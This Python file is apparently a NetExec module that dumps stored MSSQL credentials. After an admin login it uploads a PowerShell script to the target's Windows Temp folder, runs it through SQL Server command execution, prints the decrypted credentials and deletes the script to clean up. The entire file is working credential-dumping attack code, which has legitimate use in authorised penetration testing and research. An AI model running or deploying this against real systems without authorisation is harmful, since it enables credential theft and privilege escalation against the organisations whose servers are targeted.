# Module writen by @Defte_ based on the work of the following persons:
# Antti Rantasaari: https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-credential-passwords/
# Scott Sutherland: https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/
# And the following PowerShell scripts made by the same persons:
# https://github.com/NetSPI/Powershell-Modules

from pathlib import Path
from datetime import datetime
from nxc.helpers.misc import CATEGORY

from nxc.paths import DATA_PATH
from nxc.protocols.mssql.mssqlexec import MSSQLEXEC


class NXCModule:
    name = "mssql_syscredentials"
    description = "Dumps MSSQL syscredentials"
    supported_protocols = ["mssql"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self, context=None, module_options=None):
        self.share = "C$"
        self.remote_tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_share = self.remote_tmp_dir.split(":")[1]
        self.script_name = f"mssql_syscredentials{datetime.now().strftime('%Y%m%d%H%M%S')}.ps1"

    def options(self, context, module_options):
        pass

    def on_admin_login(self, context, connection):
        self.connection = connection
        self.logger = context.log

        local_script_path = f"{DATA_PATH}/mssql_syscredentials_module/mssql_syscredentials.ps1"
        if not Path(local_script_path).is_file():
            self.logger.fail(f"Cannot read {local_script_path}")
            return

        with open(local_script_path) as handle:
            script_content = handle.read()

        self.logger.display(f"Copy mssql_syscredentials.ps1 to {self.remote_tmp_dir}{self.script_name}")
        exec_method = MSSQLEXEC(self.connection.conn, self.logger)
        self.logger.display(f"Executing {self.remote_tmp_dir}{self.script_name}")
        exec_method.put_file(script_content.encode(), f"{self.remote_tmp_dir}{self.script_name}")
        for line in exec_method.execute(f"powershell.exe -c {self.remote_tmp_dir}{self.script_name}").splitlines():
            if line != "NULL":
                self.logger.highlight(line)

        exec_method.execute(f"del {self.remote_tmp_dir}{self.script_name}")
        self.logger.display(f"{self.remote_tmp_dir}{self.script_name} deleted")
